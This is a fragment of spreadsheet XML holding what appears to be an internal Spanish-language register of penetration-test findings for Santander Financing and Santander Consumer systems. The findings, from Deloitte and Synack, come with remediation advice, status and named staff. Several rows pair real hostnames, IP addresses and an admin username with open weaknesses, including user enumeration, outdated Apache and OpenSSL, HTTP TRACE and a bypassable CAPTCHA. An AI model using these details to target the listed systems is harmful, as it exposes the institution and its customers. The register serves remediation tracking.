    <s v="Durante las pruebas realizadas, se ha podido comprobar que existen varias páginas residuales no enlazadas con el resto de la aplicación._x000a_A continuación, se muestran algunos ejemplos:_x000a_• https://santanderfinancing.com/prueba:_x000a_https://santanderfinancing.com/comercios_aliados/cliente-02/:_x000a_*En este ejemplo se puede observar cómo se expone el nombre del usuario administrador de Wordpress adminSantanderConsumer._x000a_Se recomienda visualizar todas las páginas accesibles desde la red pública a través de las siguientes URL:_x000a_• https://santanderfinancing.com/page-sitemap.xml_x000a_• https://santanderfinancing.com/sitemap_index.xml_x000a_Una vez visualizadas, se deberían eliminar todas aquellas que sean pruebas, que hayan quedado desactualizadas o que ya no sean útiles para el usuario."/>
    <s v="Se recomienda eliminar todas las páginas residuales o limitar su acceso desde la red pública. En tales condiciones, solo deberían quedar aquellas que sean indispensables para dar el servicio al usuario. Como medida adicional, también se recomienda deshabilitar las funcionalidades de la aplicación que no sean estrictamente necesarias para el correcto funcionamiento de esta."/>
    <s v="Las páginas residuales suponen un riesgo de cara a la aplicación, debido a que se aumenta la superficie de ataque y se facilita la exposición de información de interés para el atacante. Todo esto sucede sin que aporten valor alguno al funcionamiento del aplicativo o a la experiencia del usuario."/>
    <m/>
    <s v="Certificada"/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="26"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Simplefinance"/>
    <s v="MAN-651adb37f74e327f9d0a09af"/>
    <s v="SC-23-CNMPA-002-AP-006"/>
    <x v="15"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="https://190.85.213.99:4443/SimpleFinance/login"/>
    <m/>
    <m/>
    <d v="2023-02-10T00:00:00"/>
    <n v="1229"/>
    <d v="2023-05-11T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="El aplicativo o servicio permite conocer la existencia de nombres de usuario en el sistema. Este comportamiento se puede producir de dos maneras distintas: _x000a_• El aplicativo o servicio muestra mensajes distintos que permiten discernir si un determinado usuario es un usuario válido en el sistema o aplicación afectada.}_x000a_• El aplicativo o servicio permite recuperar o acceder al listado de los usuarios dados de alta de manera total o parcial_x000a__x000a_Durante las pruebas realizadas se ha comprobado que la aplicación devuelve un mensaje de error indicando que el usuario no existe al modificar el parámetro “params”._x000a_"/>
    <s v="Se recomienda que el aplicativo no permita proporcionar un listado de usuario presentes en el sistema a roles que no sean administrativos. Así mismo, se recomienda no proporcionar evidencias que nos permitan discernir si el usuario introducido está dado de alta, o no, mediante mensajes de error, tamaño de las respuestas del servidor o tiempos de respuesta de la aplicación, tal y como hemos identificado en el alcance de las presentes pruebas."/>
    <s v="Esta debilidad podría ser utilizada por un atacante para intentar obtener un listado de los usuarios del sistema. Posteriormente, podría utilizar dicha información para planificar y generar ataques de mayor impacto en el aplicativo como, por ejemplo, ataques de averiguación de contraseñas, ataques de phishing, ataques de fuerza bruta o &quot;password spraying&quot; sobre las contraseñas de los usuarios existentes en el sistema con la finalidad de obtener acceso a alguna cuenta de usuario o administrador."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <m/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="27"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Factoring"/>
    <s v="MAN-65129c97f74e327f9d0969f7"/>
    <s v="SC-23-CNMPO-001-CO-003"/>
    <x v="16"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="https://64.76.176.202/factoring/index.seam"/>
    <n v="443"/>
    <m/>
    <d v="2023-09-26T00:00:00"/>
    <n v="1001"/>
    <d v="2023-12-25T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-04-09T00:00:00"/>
    <s v="Durante las pruebas realizadas se ha podido comprobar que el certificado utilizado para proporcionar comunicaciones cifradas entre los navegadores del cliente y el servidor web se encuentra caducado."/>
    <s v="Se recomienda sustituir el certificado caducado por un certificado válido expedido por una “Autoridad de Certificación” (CA) confiable. De manera adicional, se recomienda contar con un protocolo de renovación de certificados, estableciendo fechas de renovación de los mismos y alertando de la caducidad de los certificados de manera previa para poder iniciar los trámites necesarios de la renovación de los mismos."/>
    <s v="Un atacante podría aprovechar que los mensajes de error de certificado caducado y de certificado no válido son similares para presentar su propio certificado y aprovechar el desconcierto de ciertos usuarios al aceptar el certificado del atacante como válido. De esta manera el atacante puede realizar un ataque de Man in The Middle y acceder a la información transmitida en texto claro."/>
    <m/>
    <m/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="28"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Factoring"/>
    <s v="MAN-6512e698f74e327f9d096a21"/>
    <s v="SC-23-CNMPO-001-AP-007"/>
    <x v="9"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <s v="4"/>
    <m/>
    <m/>
    <s v="https://64.76.176.202/factoring/index.seam"/>
    <n v="443"/>
    <m/>
    <d v="2023-09-26T00:00:00"/>
    <n v="1001"/>
    <d v="2023-12-25T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-04-09T00:00:00"/>
    <s v="Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión del usuario no tienen aplicado el atributo de seguridad &quot;HttpOnly&quot;. Este atributo impide el robo del identificador de sesión del usuario almacenado en la cookie mediante ataques de Cross Site Scripting, ya que no permite el acceso a la misma mediante scripts del lado del cliente."/>
    <s v="Se recomienda proteger los identificadores de sesión, almacenados a través de las cookies, mediante el atributo de seguridad &quot;HttpOnly&quot;. De esta manera se evita que se pueda acceder al identificador de sesión desde secuencias de comandos (JavaScript, ActiveX)."/>
    <s v="El robo de identificadores de la sesión de un usuario a través de las cookies podría permitir a un atacante acceder a las sesiones privadas de otros usuarios, suplantando la identidad de los mismos dentro de la aplicación."/>
    <m/>
    <m/>
    <s v="Jaime Vargas"/>
  </r>
  <r>
    <n v="29"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="MAN-6512c75ef74e327f9d0969f8"/>
    <s v="SC-23-CNMPA-03-VE-001"/>
    <x v="11"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="6.4"/>
    <s v="CVE-2022-28614_x000a_CVE-2022-28615_x000a_CVE-2023-2650_x000a_CVE-2022-0778"/>
    <m/>
    <s v="https://santanderfinancing.com:4443/portalpagos/registerTransaction"/>
    <n v="4443"/>
    <m/>
    <d v="2023-09-26T00:00:00"/>
    <n v="1001"/>
    <d v="2023-12-25T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-01-24T00:00:00"/>
    <s v="Durante la realización de las pruebas se ha podido comprobar que el activo afectado hace uso de cierta versión de software que presenta vulnerabilidades conocidas y divulgadas públicamente._x000a__x000a_Las versiones de ambas tecnologías se ven afectadas por múltiples vulnerabilidades que podrían afectar al correcto funcionamiento del activo siendo posible incluso causar una denegación de servicio, motivo por el cual no han sido explotados durante las pruebas. A continuación, se listan algunos ejemplos de CVEs que afectan al software empleado por el activo:_x000a_• Apache 2.4.6:_x000a_- CVE-2022-28614_x000a_- CVE-2022-28615_x000a_• OpenSSL/1.0.2k-flips:_x000a_- CVE-2023-2650_x000a_- CVE-2022-0778"/>
    <s v="Se recomienda actualizar la versión tanto del servidor apache como del software OpenSSL y establecer una política de actualizaciones/gestión de parches para tratar de evitar posteriores vulnerabilidades."/>
    <s v="El software sin actualizar puede incurrir en el riesgo de ser comprometido mediante vulnerabilidades conocidas, lo cual puede poner en riesgo al activo afectado."/>
    <m/>
    <s v="Certificada"/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="30"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="MAN-6512cfb5f74e327f9d0969f9"/>
    <s v="SC-23-CNMPA-03-CO-002"/>
    <x v="17"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="5.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com:4443/portalpagos/registerTransaction"/>
    <n v="4443"/>
    <m/>
    <d v="2023-09-26T00:00:00"/>
    <n v="1001"/>
    <d v="2023-12-25T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2025-01-24T00:00:00"/>
    <s v="Se ha podido comprobar, que existe una página por defecto en la dirección https://santanderfinancing.com:4443_x000a__x000a_Página por defecto de Apache Red Hat Enterprise"/>
    <s v="Se recomienda eliminar o sustituir las páginas por defecto por páginas personalizadas que no revelen información sobre la tecnología subyacente. Como medida adicional, también se recomienda deshabilitar las funcionalidades de la aplicación que no sean estrictamente necesarias para el correcto funcionamiento de la misma."/>
    <s v="Las páginas y archivos disponibles por defecto brindan información adicional sobre la infraestructura de las aplicaciones Web. Esta información permite a un atacante o usuario malintencionado planificar ataques enfocados sobre las aplicaciones web, framework/lenguaje de programación utilizado para su desarrollo o el software del servidor en el que se encuentran prestando servicio."/>
    <m/>
    <s v="Certificada"/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="31"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="MAN-6512d054f74e327f9d0969fa"/>
    <s v="SC-23-CNMPA-03-AP-003"/>
    <x v="18"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="4.0999999999999996"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com:4443/portalpagos/registerTransaction"/>
    <n v="4443"/>
    <m/>
    <d v="2023-09-26T00:00:00"/>
    <n v="1001"/>
    <d v="2023-12-25T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-12-12T00:00:00"/>
    <s v="Se ha detectado que la aplicación devuelve información acerca de rutas internas del sistema de ficheros del servidor. Esta información podría ser utilizada por un atacante con el objetivo de recabar información para ataques futuros."/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa al funcionamiento interno del servidor, como pueden ser rutas internas o ubicación de ficheros o directorios dentro del mismo. Este tipo de información puede ser accesible a través de los identificadores de sesión utilizados, mensajes de error y/o páginas por defecto._x000a__x000a_https://blogs.msdn.microsoft.com/varunm/2013/04/23/remove-unwanted-http-response-headers/"/>
    <s v="Un atacante podría aprovechar esta vulnerabilidad para obtener más información sobre el sistema o el software instalado, pudiendo identificar el tipo de servidor, o versión de software. Esta información le permitiría localizar vulnerabilidades existentes en los productos software instalados y aprovecharlas para tomar el control del sistema."/>
    <m/>
    <m/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="32"/>
    <s v="SF"/>
    <s v="Synack"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="helicopter-w388-3"/>
    <m/>
    <x v="19"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com/base-formulario/"/>
    <m/>
    <m/>
    <d v="2023-08-02T00:00:00"/>
    <n v="1056"/>
    <d v="2023-10-31T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Al probar la aplicación web, **santanderfinancing.com**, se encontró que el parámetro y valor CAPTCHA `et_pb_contact_captcha_1` no está implementado en el lado del servidor. El atacante puede eludir la limitación de velocidad en la página Contacto enviando la solicitud múltiple contra el valor y el parámetro CAPTCHA. El Captcha no está implementado en el lado del servidor. Un atacante puede saltarse esto y enviar múltiples peticiones al servidor."/>
    <s v="CAPTCHA está en alto riesgo de ser evitado por múltiples métodos, y necesitamos una solución para no dejar que los bots y los intrusos maliciosos lo hagan como varios métodos de evasión CAPTCHA. Necesitamos una mejor manera de asegurar los datos del usuario y reducir el sitio web a ser desbordado de bots. Algunas técnicas de prevención de CAPTCHA Bypassing se explican a continuación:_x000a__x000a_   * Lista negra de IP: Poner en lista negra la dirección IP desde la que se envía la solicitud varias veces._x000a_   * Monitorización del tiempo de respuesta _x000a_   * Cambio entre CAPTCHAs_x000a_   * Claves de sitio: Este escudo impide que un CAPTCHA se muestre en un sitio distinto del propuesto, moderando así los ataques de abuso humano. Esta defensa probablemente no va a influir en los clientes auténticos de un sitio en cualquier capacidad; todas las cosas consideradas, estructurado claramente para prevenir el escaparate de un CAPTCHA en un lugar no aprobado. Cuando se da una clave al propietario del sitio, ejecutarla puede ser tan necesario como incluir un par de líneas de código._x000a__x000a_En este caso, parece que el CAPTCHA sólo se valida del lado del cliente. Validar el CAPTCHA del lado del servidor."/>
    <s v="No rate limiting es un fallo que no limita el número de intentos que uno hace en el servidor de un sitio web para extraer datos. Los siguientes son los impactos de Bypassing CAPTCHA (Rate Limiting) en la Aplicación. _x000a__x000a_1. Debido a la falta de validación del lado del servidor en el `CAPTCHA`, no hay limitación de tasa en la Página `Contacto`._x000a_2. Todo el propósito de tener la característica de seguridad de `CAPTCHA` se ha ido en vano._x000a_3. Un usuario malintencionado puede solicitar infinitas veces._x000a_4. No hay Validación del lado del servidor en el `Google` Captcha, puede ser evitado por la Eliminación del valor Captcha y Parámetro. _x000a_5. El atacante puede enviar múltiples peticiones al servidor con los mismos valores de contenido. "/>
    <s v="1° Fecha: 28/02/2025_x000a__x000a_2°Sin fecha "/>
    <s v="Se encuentra en processo de validacion con el equipo de desarrollo"/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="33"/>
    <s v="SF"/>
    <s v="Synack"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <s v="helicopter-w388-6"/>
    <m/>
    <x v="20"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="5.3"/>
    <m/>
    <m/>
    <s v="https://autofinance.santanderfinancing.com/account/v1/account/login"/>
    <m/>
    <m/>
    <d v="2023-07-02T00:00:00"/>
    <n v="1087"/>
    <d v="2023-09-30T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La enumeración de nombres de usuario es el proceso de intentar identificar nombres de usuario válidos en una página de inicio de sesión probando repetidamente diferentes combinaciones de entradas de nombres de usuario. Los atacantes utilizan esta técnica para conocer la estructura de cuentas de usuario de un sitio web e identificar objetivos potenciales para ataques con contraseña. Un sitio web es vulnerable a la enumeración de nombres de usuario si proporciona mensajes de error diferentes para nombres de usuario válidos e inválidos. Esta información puede utilizarse para lanzar ataques más específicos en la página de inicio de sesión, lo que aumenta la probabilidad de éxito. Para evitar la enumeración de nombres de usuario, los sitios web deben asegurarse de que sus mensajes de error para intentos de inicio de sesión no válidos sean coherentes, independientemente de si el nombre de usuario es válido o no."/>
    <s v="A continuación se indican algunas medidas correctivas que pueden ayudar a mitigar el riesgo de enumeración de nombres de usuario en las páginas de inicio de sesión:_x000a__x000a_Mensajes de error coherentes: Proporcione mensajes de error coherentes para todos los intentos de inicio de sesión no válidos, independientemente de si el nombre de usuario es válido o no. Esto dificultará a los atacantes la determinación de nombres de usuario válidos._x000a__x000a_Limite los intentos de inicio de sesión: Implementa la limitación de velocidad o el bloqueo de IP para evitar que los atacantes realicen demasiados intentos de inicio de sesión en un corto periodo de tiempo. Esto ralentizará el proceso de enumeración de nombres de usuario y reducirá el riesgo de éxito de los ataques._x000a__x000a_Utilizar CAPTCHA: Incorporar un mecanismo CAPTCHA puede prevenir ataques automatizados y dificultar a los atacantes la enumeración de nombres de usuario._x000a__x000a_Utilice la autenticación de dos factores: Implementar la autenticación de dos factores (2FA) puede proporcionar una capa adicional de seguridad y dificultar a los atacantes el acceso no autorizado a las cuentas de usuario._x000a__x000a_Auditorías de seguridad periódicas: Las auditorías regulares de seguridad y las pruebas de penetración pueden ayudar a identificar y abordar las vulnerabilidades, incluidas las relacionadas con la enumeración de nombres de usuario._x000a__x000a_Tenga en cuenta que estas medidas correctoras pueden no ser exhaustivas y tener que adaptarse a los requisitos específicos del sitio web y su infraestructura. La mejor forma de prevenir la enumeración de nombres de usuario y otros riesgos de seguridad es implantar un programa de seguridad integral."/>
    <s v="El impacto de la enumeración de nombres de usuario en una página de inicio de sesión puede ser significativo y dar lugar a diversos riesgos y problemas de seguridad:_x000a__x000a_Apropiación de cuentas: Al conocer los nombres de usuario válidos, un atacante puede utilizar ataques de fuerza bruta o de diccionario para descifrar contraseñas y obtener acceso no autorizado a cuentas de usuario._x000a__x000a_Fuga de información: Los mensajes de error devueltos por una página de inicio de sesión pueden revelar información sobre la tecnología subyacente o la estructura de la base de datos de usuarios, que puede utilizarse para planificar nuevos ataques._x000a__x000a_Aumento del riesgo de éxito de los ataques: La enumeración de nombres de usuario facilita a los atacantes el lanzamiento de ataques más focalizados y efectivos, aumentando la probabilidad de un compromiso exitoso._x000a__x000a_Pérdida de confianza: Si los usuarios son conscientes de las vulnerabilidades de seguridad de un sitio web, pueden perder la confianza en él y optar por no utilizarlo, lo que puede dañar la reputación del sitio web y de su propietario._x000a__x000a_Por lo tanto, es importante abordar el problema de la enumeración de nombres de usuario en las páginas de inicio de sesión y asegurarse de que el sitio está protegido contra este tipo de ataques."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <s v="Se esta en proceso de baja del servicio "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="34"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <s v="MAN-3934cc06"/>
    <s v="SCO-22-CNMPO-001-CO-001"/>
    <x v="10"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <s v="5"/>
    <m/>
    <m/>
    <s v="https://autofinance.santanderfinancing.com"/>
    <m/>
    <m/>
    <d v="2022-08-18T00:00:00"/>
    <n v="1405"/>
    <d v="2022-11-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Durante las pruebas realizadas se ha comprobado que las cabeceras de respuesta del servidor que sustenta la aplicación https://autofinance.santanderfinancing.com/UHJ1ZWJhc0FwcENsaWVudGVz revelan información interna acerca del Tipo de Servidor y/o infraestructura interna de la aplicación."/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa a la naturaleza y versión de esta. Este tipo de información puede ser accesible a través de los identificadores de sesión utilizados, mensajes de error y/o páginas por defecto. Para más información consulte en:_x000a__x000a_https://blogs.msdn.microsoft.com/varunm/2013/04/23/remove-unwanted-http-response-headers/"/>
    <s v="Conocer la version y tipo del servidor web que se está ejecutando en el activo analizado permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas. De esta manera, el atacante podría hacerse con el control del activo analizado de ser éste vulnerable."/>
    <s v="1° Fecha:31/01/2025_x000a_2° Fecha: 30/05/2025"/>
    <s v="Se esta en proceso de baja del servicio "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="35"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="API Viabilizacion"/>
    <s v="MAN-fc1d4de3"/>
    <s v="SCO-21-CNMPA-004-CO-001"/>
    <x v="10"/>
    <m/>
    <x v="0"/>
    <s v="Medium"/>
    <n v="4.5999999999999996"/>
    <m/>
    <m/>
    <s v="api.premiercredit.co"/>
    <n v="1444"/>
    <m/>
    <d v="2021-01-26T00:00:00"/>
    <n v="1974"/>
    <d v="2021-04-26T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2024-10-15T00:00:00"/>
    <s v="Durante las pruebas realizadas se ha comprobado que las cabeceras de respuesta del servidor que sustenta la aplicación https://api.premiercredit.co:11444/ revelan información interna acerca de la infraestructura interna de la aplicación._x000a__x000a_Con la información obtenida, un atacante podría saber que el sistema operativo instalado en el servidor es Windows 8.1 o Windows Server 2012 R2 a partir de la información publicada en Wikipedia"/>
    <s v="Se recomienda evitar que la aplicación devuelva al usuario información relativa a la naturaleza y versión de esta. _x000a_Este tipo de información puede ser accesible a través de la cabecera de respuesta HTTP Server. Para más información consulte en: •https://blogs.msdn.microsoft.com/varunm/2013/04/23/remove-unwanted-http-response-headers/"/>
    <s v="Conocer la versión y tipo del servidor web que se está ejecutando en el activo analizado permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas. De esta manera, el atacante podría hacerse con el control del activo analizado de ser éste vulnerable."/>
    <m/>
    <s v="Activo dado de baja"/>
    <s v="Jenny Rodriguez"/>
  </r>
  <r>
    <n v="36"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <s v="MAN-33c52d09"/>
    <s v="SC-22-CNMPO-12-AP-002"/>
    <x v="21"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="3.7"/>
    <m/>
    <m/>
    <s v="autofinance.santanderfinancing.com"/>
    <m/>
    <m/>
    <d v="2022-11-02T00:00:00"/>
    <n v="1329"/>
    <d v="2023-01-31T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha observado que la cookie se sesión de la aplicación no está protegida por el atributo “HttpOnly”. Este atributo se utiliza para indicarle al navegador que la cookie no sea accedida por código JavaScript."/>
    <s v="Se recomienda modificar la configuración de la aplicación de manera tal que la cookie de sesión no pueda ser accedida a través de código JavaScript. Para ello, la configuración de la cookie en el navegador del usuario debe llevar el atributo “HttpOnly”."/>
    <s v="La ausencia del atributo “HttpOnly”, en la configuración de una cookie en el navegador, podría permitirle a un individuo malicioso lograr explotar de manera exitosa una potencial vulnerabilidad de Cross-site Scripting, capturar la sesión de un usuario autenticado y posteriormente utilizarla para acceder a la aplicación."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <s v="Se esta en proceso de baja del servicio "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="37"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <s v="MAN-33c52d4b"/>
    <s v="SC-22-CNMPO-12-CO-003"/>
    <x v="22"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="3.7"/>
    <m/>
    <m/>
    <s v="autofinance.santanderfinancing.com"/>
    <m/>
    <m/>
    <d v="2022-11-02T00:00:00"/>
    <n v="1329"/>
    <d v="2023-01-31T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La vulnerabilidad de TLS MAC Calculation Timing Attack o LUCKY13 es una vulnerabilidad de cifrado que aplica a la implementación de Transport Layer Security (TLS) que utilizan el modo de cifrado CBC._x000a_Este ataque consiste en detectar pequeñas diferencias de tiempo cuando se producen errores TLS generados a base de mandar peticiones maliciosas al servidor. Con estos ataques es posible descifrar bloques TLS, aunque la cantidad de peticiones depende del tipo de conexión, el ruido y el algoritmo de MAC utilizado."/>
    <s v="Se recomienda deshabilitar el modo de cifrado CBC y aplicar los parches disponibles."/>
    <s v="Se ha detectado que es posible utilizar mecanismos de cifrado considerados inseguros en las comunicaciones con los servidores, lo que podría permitir a un eventual atacante comprometer la confidencialidad de la información intercambiada entre un cliente y el servidor, y en algunos casos también provocar indisponibilidad del servidor."/>
    <s v="1° Fecha:31/01/2025_x000a_2° Fecha: 30/05/2025"/>
    <s v="Se esta en proceso de baja del servicio "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="38"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <s v="MAN-33c52da2"/>
    <s v="SC-22-CNMPO-12-CO-004"/>
    <x v="23"/>
    <m/>
    <x v="2"/>
    <s v="Medium"/>
    <n v="3.5"/>
    <m/>
    <m/>
    <s v="autofinance.santanderfinancing.com"/>
    <m/>
    <m/>
    <d v="2022-11-02T00:00:00"/>
    <n v="1329"/>
    <d v="2023-01-31T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha observado que los servicios afectados soportan la utilización del método HTTP TRACE. Este método, bajo ciertas condiciones, podría ser aprovechado por individuos maliciosos para ejecutar ataques del tipo Cross-Site Tracing._x000a_El atributo de seguridad HTTPOnly es utilizado para proteger las cookies de sesión de los usuarios autenticados en las aplicaciones Web. De esta manera, al código JavaScript ejecutado en el navegador no se le permite acceder a su contenido. Sin embargo, si se emplearan cookies de sesión y el método TRACE pudiera ser empleado para acceder recursos en el servidor de la aplicación, desde el navegador de una víctima se enviaría la cookie de sesión como parte del request HTTP y el servidor respondería reflejando el contenido del request en el cuerpo del response HTTP. De esta manera, sería posible acceder al contenido de la cookie de sesión por medio de código JavaScript, eludiendo la protección impuesta por el atributo HTTPOnly."/>
    <s v="Se recomienda analizar si el método HTTP TRACE es requerido por el negocio, y deshabilitarlo en caso de no ser requerido. De igual manera, se recomienda revisar los estándares de configuración de los servidores para asegurar que los métodos HTTP innecesarios se encuentren deshabilitados antes de promover un servidor a producción."/>
    <s v="Si una aplicación que reside en el servicio afectado tuviera algún componente vulnerable a Cross-Site Scripting (XSS), aun cuando la cookie de sesión fuera protegida mediante el atributo HTTPOnly, un individuo malicioso podría aprovechar la disponibilidad del método TRACE para realizar el ataque conocido como Cross-Site Tracing (XST). Mediante la inyección de código JavaScript especialmente diseñado en el recurso vulnerable a XSS, el individuo malicioso podría lograr que la cookie de sesión sea reflejada en el cuerpo del response HTTP y así acceder a su contenido, para ingresar a la aplicación en nombre de la víctima y obtener información sensible o realizar operaciones privilegiadas en su nombre."/>
    <s v="1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <s v="Se esta en proceso de baja del servicio "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="39"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Santanderfinancing"/>
    <s v="MAN-6512d0e0f74e327f9d0969fb"/>
    <s v="SC-23-CNMPA-03-CO-004"/>
    <x v="24"/>
    <m/>
    <x v="1"/>
    <s v="Medium"/>
    <n v="3.9"/>
    <m/>
    <m/>
    <s v="https://santanderfinancing.com:4443/portalpagos/registerTransaction"/>
    <m/>
    <m/>
    <d v="2023-09-26T00:00:00"/>
    <n v="1001"/>
    <d v="2023-12-25T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="La aplicación analizada presenta una vulnerabilidad de directorios en la dirección https://santanderfinancing.com:4443/icons/."/>
    <s v="Crear en cada directorio un fichero index por defecto (index.html) para que el servidor muestre la página por defecto en vez del listado de directorios."/>
    <s v="Dependiendo del tipo de información que contengan los ficheros incluidos en los directorios podría tener un mayor o menor en el impacto de la confidencialidad de los datos. Un atacante podría utilizar la información encontrada para realizar posteriormente un ataque dirigido."/>
    <m/>
    <s v="Solventada/pendiente de certificación "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="40"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Infraestructura"/>
    <m/>
    <m/>
    <s v="Autofinance"/>
    <s v="MAN-667c3389413b406ff3f83df0"/>
    <s v="SCO-24-CNMPO-009-CO-002"/>
    <x v="25"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="1"/>
    <m/>
    <m/>
    <s v="https://autofinance.santanderfinancing.com/"/>
    <s v="443"/>
    <m/>
    <d v="2024-06-26T15:28:09"/>
    <n v="726.35545138888847"/>
    <d v="2024-10-24T15:28:09"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Se ha podido comprobar que el servidor que sustenta la aplicación es vulnerable a Lucky13."/>
    <s v="Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso. _x000a_Además, se debe comprobar si la versión OpenSSL es 1.0.1d, 1.0.0k o 0.9.8y, las cuales tienen corregida esta vulnerabilidad. Actualizar la versión de OpenSSL si tiene una versión sin la vulnerabilidad corregida. _x000a_Puede actualizar la versión de OpenSSL desde su repositorio del sistema operativo o bien descargando la última versión del siguiente enlace: _x000a_•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1° Fecha: 28/02/2025_x000a_2° Fecha: 30/05/2025"/>
    <s v="Se esta en proceso de baja del servicio "/>
    <s v="Jenny Alejandra Rodriguez"/>
  </r>
  <r>
    <n v="41"/>
    <s v="SF"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Aliados"/>
    <s v="MAN-66548077c382686af2c85600"/>
    <s v="SCO-24-CNMPO-001-AP-003"/>
    <x v="26"/>
    <m/>
    <x v="2"/>
    <s v="Low"/>
    <n v="2.5999999046325684"/>
    <m/>
    <m/>
    <s v="aliados.santanderconsumer.co"/>
    <s v="443"/>
    <m/>
    <d v="2024-05-27T12:45:43"/>
    <n v="756.46825231481489"/>
    <d v="2024-09-24T12:45:43"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
